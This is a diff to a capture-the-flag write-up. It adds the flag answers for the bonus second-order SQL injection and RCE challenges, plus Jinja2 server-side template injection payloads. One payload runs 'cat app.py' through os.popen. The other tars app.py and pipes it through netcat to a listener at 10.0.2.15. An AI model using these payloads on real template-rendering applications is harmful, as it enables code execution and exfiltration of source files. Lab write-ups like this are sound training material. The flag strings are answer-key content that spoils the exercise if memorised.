@@ -34,14 +34,10 @@ Date: 2026-06-06
 	- *FLAG{x55_st0r3d_c00k13_st0l3n};*
 8. Eighth flag - Template injection
 	- *FLAG{5st1_t3mpl4t3_1nj3ct10n_rce}*
-9. Ninth flag
-	- *...*
-10. Tenth flag
-	- *...*
-11. Eleventh flag
-	- *...*
-12. Twelfth flag
-	- *...*
+9. Ninth flag - BONUS
+	- *FLAG{s3c0nd_0rd3r_sql1_d4ng3r0us}*
+10. Tenth flag - RCE
+	- *FLAG{rce_full_pwn_y0u_0wn_th3_b0x}*
 
 ---
 # Preparation
@@ -180,3 +176,7 @@ Content-Type: image/jpeg
 ```
 `ssti_flag.txt`
 **`FLAG{5st1_t3mpl4t3_1nj3ct10n_rce}`**
+`{{ cycler.__init__.__globals__.os.popen('cat app.py').read() }}`
+```python
+{{ cycler.__init__.__globals__.os.popen('tar -czf - app.py | nc 10.0.2.15 1234').read() }}
+```
